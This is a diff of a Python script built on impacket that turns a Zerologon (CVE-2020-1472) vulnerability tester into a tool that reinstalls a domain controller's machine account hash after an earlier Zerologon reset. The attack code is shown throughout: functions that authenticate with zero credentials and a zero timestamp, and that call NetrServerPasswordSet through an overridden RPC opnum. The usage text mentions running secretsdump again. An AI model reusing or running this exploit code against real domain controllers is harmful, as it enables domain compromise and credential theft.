@@ -34,9 +34,6 @@ class NetrServerPasswordSetResponse(nrpc.NDRCALL):
         ('ErrorCode',nrpc.NTSTATUS),
     )
 
-def byte_xor(ba1, ba2):
-    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
-
 def fail(msg):
   print(msg, file=sys.stderr)
   print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
@@ -88,15 +85,16 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw):
       #print("authenticator cred", authenticatorCred)
       authenticator['Credential'] = ciphertext #authenticatorCred
       authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
-      request = nrpc.NetrLogonGetCapabilities()
-      request['ServerName'] = '\x00'*20
-      request['ComputerName'] = target_computer + '\x00'
-      request['Authenticator'] = authenticator
-      request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      request['ReturnAuthenticator']['Timestamp'] = 0 
-      request['QueryLevel'] = 1
+      #request = nrpc.NetrLogonGetCapabilities()
+      #request['ServerName'] = '\x00'*20
+      #request['ComputerName'] = target_computer + '\x00'
+      #request['Authenticator'] = authenticator
+      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
+      #request['ReturnAuthenticator']['Timestamp'] = 0 
+      #request['QueryLevel'] = 1
       #resp = rpc_con.request(request)
       #resp.dump()
+
       nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
       nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
       
@@ -147,7 +145,7 @@ def perform_attack(dc_handle, dc_ip, target_computer, originalpw):
       break
 
   if rpc_con:
-    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
+    print('\nSuccess! DC machine account should be restored to it\'s original value. You might want to secretsdump again to check.')
   else:
     print('\nAttack failed. Target is probably patched.')
     sys.exit(1)
@@ -155,8 +153,8 @@ def perform_attack(dc_handle, dc_ip, target_computer, originalpw):
 
 if __name__ == '__main__':
   if not (4 <= len(sys.argv) <= 5):
-    print('Usage: zerologon_tester.py <dc-name> <dc-ip> <hexlified original pw>\n')
-    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
+    print('Usage: reinstall_original_pw.py <dc-name> <dc-ip> <hexlified original nthash>\n')
+    print('Reinstalls a particular machine hash for the machine account on the target DC. Assumes the machine password has previously been reset to the empty string')
     print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
     sys.exit(1)
   else:
